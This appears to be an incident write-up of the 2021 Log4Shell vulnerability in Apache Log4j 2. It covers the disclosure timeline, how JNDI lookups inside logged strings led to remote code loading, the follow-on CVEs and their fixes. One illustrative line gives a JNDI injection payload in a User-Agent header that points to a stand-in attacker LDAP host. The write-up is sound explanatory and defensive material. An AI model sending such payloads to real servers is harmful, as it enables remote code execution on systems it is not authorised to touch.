---
title: "Log4Shell: logging a string could make a Java server load and run code from an attacker's LDAP server"
dek: "Log4j 2 expanded lookup expressions inside log messages, and one of those lookups was JNDI, which can fetch and run Java code from a remote server. Any application that logged attacker-controlled text, such as a header or a username, could be made to execute arbitrary code. CVSS 10."
date: 2021-12
company: Apache
kind: security-breach
topics: [security, dependency, supply-chain]
stack: [java, log4j, jndi, ldap]
impact: "CVE-2021-44228, scored 10.0 CRITICAL: an attacker who controls log messages or their parameters can execute arbitrary code loaded from LDAP servers."
detected_by: third-party
rule: "Never interpret data you are only supposed to record. A logging call that evaluates its input is an eval on attacker-controlled strings."
postmortem: https://logging.apache.org/log4j/2.x/security.html
sources: [https://logging.apache.org/log4j/2.x/security.html, https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf]
---

# Log4Shell: logging a string could make a Java server load and run code from an attacker's LDAP server

In December 2021, the Apache Log4j project published an advisory with a summary that sounds impossible for a logging library: ["JNDI lookup can be exploited to execute arbitrary code loaded from an LDAP server"](https://logging.apache.org/log4j/2.x/security.html). The CVE, CVE-2021-44228, was scored [10.0 CRITICAL](https://logging.apache.org/log4j/2.x/security.html), the maximum.

The precondition was ordinary: an attacker who can control a log message or its parameters. Almost every server application logs things users send it. The US Cyber Safety Review Board (CSRB), which later reviewed the event, described it as a ["once-in-a-generation security event"](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf) and concluded that Log4j is an ["endemic vulnerability"](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf) that will remain in systems for many years, "perhaps a decade or longer".

This post is about the mechanism: how a library whose job is to write strings to a file ended up fetching and running code.

## What happened

The [CSRB report](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf) gives the history:

- **July 2013:** A community member requested "JNDI Lookup plugin support" for Log4j 2 and supplied a patch. The Log4j team reviewed it and committed it on 18 July 2013 for release in version 2.0-beta9. The feature went into general availability with Log4j 2.0 in 2014.
- **24 November 2021:** A security engineer from Alibaba Cloud's security team emailed the Apache Software Foundation (ASF) about the vulnerability, with a description, a pointer to the code, a proof of concept and screenshots. The ASF received it at [07:51 UTC](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf).
- **From 29 November:** The ASF reviewed fix code in public pull requests, committed the fix on 5 December and tagged a release candidate on 6 December, without a security advisory.
- **1 December:** The [earliest known exploitation](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf), observed over two days by a technology services company, which assessed it as consistent with testing of the Alibaba engineer's proof of concept.
- **9 December:** The Alibaba engineer told the ASF the vulnerability was being discussed on WeChat, where a PRC-based security company had posted a redacted screenshot of an exploit. With public reports of exploitation, the ASF released ahead of plan.
- **10 December:** Log4j 2.15.0 and CVE-2021-44228 made public. CISA issued a statement the same day.

Sources differ slightly on the "disclosure" date. The CSRB refers to public disclosure on [9 December](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf) (the WeChat post) while the fix and CVE went public on 10 December. Both are in the same report.

The Log4j advisory credits the discovery to [Chen Zhaojun of Alibaba Cloud Security Team](https://logging.apache.org/log4j/2.x/security.html).

## What the engineers believed

The assumption Log4j users made, reasonably, was: **a logger records strings. It doesn't act on them.** You pass it a message, it formats it and writes it somewhere. Developers routinely log untrusted input, such as request paths, user agents and usernames, precisely because logging is supposed to be the safe, passive thing you do with data.

The Log4j project, for its part, accepted the JNDI lookup as [a feature intended to ease data storage and retrieval](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf), through its standard review process. Lookups were a configuration convenience. The danger came from where else they were evaluated.

## What was actually going on

### Lookups: templates inside log output

*(Background.)* Log4j 2 has **lookups**: expressions of the form `${prefix:key}` that get replaced with a value at logging time. `${env:HOME}` reads an environment variable; `${ctx:loginId}` reads a value from the thread context map. They're meant for configuration, so a pattern can say "include the login ID in each line".

The advisory's own examples show the syntax, such as [`$${ctx:loginId}`](https://logging.apache.org/log4j/2.x/security.html) in a pattern layout. The crucial detail is in the CVE description: the JNDI features [used in configurations, log messages, and parameters](https://logging.apache.org/log4j/2.x/security.html) don't protect against attacker-controlled endpoints. *Log messages and parameters*, not just configuration. The CSRB report adds the condition: arbitrary code can be run ["when message lookup substitution is enabled"](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf).

In other words, in affected versions, a lookup expression that arrived inside the data being logged could be expanded, the same as one in the configuration.

### JNDI: a lookup that can load code

*(Background.)* JNDI, the Java Naming and Directory Interface, is a standard Java API for looking up objects by name from directory services such as LDAP. A JNDI lookup can return not just data but a reference to a Java object, including where to load its class from. Depending on the JVM's settings, the client will then fetch and instantiate that class. That's how "look something up in a directory" turns into "run code from a remote server".

Put the two together and the attack is short. *(Background, illustrative.)* An attacker sends a request with a header like `User-Agent: ${jndi:ldap://attacker.example/x}`. The application logs the user agent. Log4j sees the lookup in the message, performs the JNDI lookup to the attacker's LDAP server, and the response directs the JVM to load and run the attacker's class.

```diagram
title: from a log line to remote code
flow: attacker string -> app logs it -> lookup expanded
flow!: LDAP lookup -> attacker's server -> JVM runs its class
note: the app only meant to record the text
```

The advisory's wording for the result: an attacker who controls log messages or parameters [can execute arbitrary code loaded from LDAP servers](https://logging.apache.org/log4j/2.x/security.html).

### Why it was so hard to defend

The CSRB report lists what amplified it. Log4j is [routinely embedded in other software components](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf), often several layers down, so organisations couldn't easily find it. By 14 December 2021, [almost 7,000 open source projects](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf) used it as a dependency. The ASF doesn't know who uses its software. And the bug was easy to exploit while giving the attacker a high degree of control.

The scale of exploitation was large: five days after disclosure, Cloudflare observed [400 exploitation attempts per second](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf), as cited by the CSRB. Yet the Board also found that exploitation happened [at lower levels than many experts predicted](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf), and it wasn't aware of significant Log4j-based attacks on critical infrastructure at the time of writing.

The Board's view on prevention: a focused review by someone experienced in the security implications of JNDI could have caught the problem in 2013, but [the resources to perform such a review were not available](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf) to the volunteers who ran the project. It also notes that researchers had presented JNDI-based remote code execution techniques publicly, including at Black Hat USA 2016, years before this CVE.

## How they fixed it

The first fix, [2.15.0](https://logging.apache.org/log4j/2.x/security.html), shipped for Java 8 and later, with 2.12.2 for Java 7 and 2.3.1 for Java 6. The CSRB report's footnotes name the changes that went into it, including ["Log4j2 no longer formats lookups in messages by default"](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf) and restricting LDAP access via JNDI.

It wasn't the last fix. Researchers found more, and the [advisory](https://logging.apache.org/log4j/2.x/security.html) lists them:

| CVE | What | Score | Fixed in (Java 8+) |
|---|---|---|---|
| CVE-2021-45046 | The 2.15.0 fix was [incomplete in certain non-default configurations](https://logging.apache.org/log4j/2.x/security.html); Thread Context lookups could still be abused | 9.0 | 2.16.0 |
| CVE-2021-45105 | Self-referential lookups cause infinite recursion and a StackOverflowError (denial of service) | 5.9 | 2.17.0 |
| CVE-2021-44832 | An attacker with write access to the logging configuration can use a JDBC Appender with a JNDI data source to run code | 6.6 | 2.17.0 |

The CSRB report describes this sequence as contributing to confusion and ["patching fatigue"](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf).

Where teams couldn't upgrade quickly, the CSRB lists the workarounds they used, including [deleting the JndiLookup.class file](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf), egress filtering, WAF rules, hot patching, and pulling affected machines off the network.

## What changed afterwards

On 17 December 2021, CISA issued [Emergency Directive 22-02](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf), requiring civilian federal agencies to address Log4j vulnerabilities within two weeks. One federal cabinet department reported spending [33,000 hours](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf) on its Log4j response.

The CSRB's recommendations are broad: better asset and software inventories (so organisations know where Log4j is), better security hygiene, and centralised resourcing and security help for the volunteer-run open source projects that so much software depends on.

## The rule

Data you record must never be data you execute. A logger, a template engine or a serializer that evaluates expressions inside its input is, in effect, running an interpreter over attacker-controlled strings, and the attack surface is whatever that interpreter can reach. Here it reached the network and the class loader. Keep "interpolation" features out of untrusted paths, turn them off by default, and be suspicious of any library feature that can fetch or load something based on a value it was handed. Separately, know what's in your dependency tree, including transitively, because the hardest part of Log4Shell for most organisations wasn't the patch. It was finding where Log4j was.

## Sources

- [Apache Log4j, "Security" (vulnerability advisories)](https://logging.apache.org/log4j/2.x/security.html): the official advisories for CVE-2021-44228 and the follow-on CVE-2021-45046, CVE-2021-45105 and CVE-2021-44832, with scores, affected and fixed versions, mitigations and credits.
- [Cyber Safety Review Board, "Review of the December 2021 Log4j Event" (11 July 2022)](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf): the US government review, covering the 2013 feature, the discovery and disclosure timeline, exploitation, response, contributing factors and recommendations.
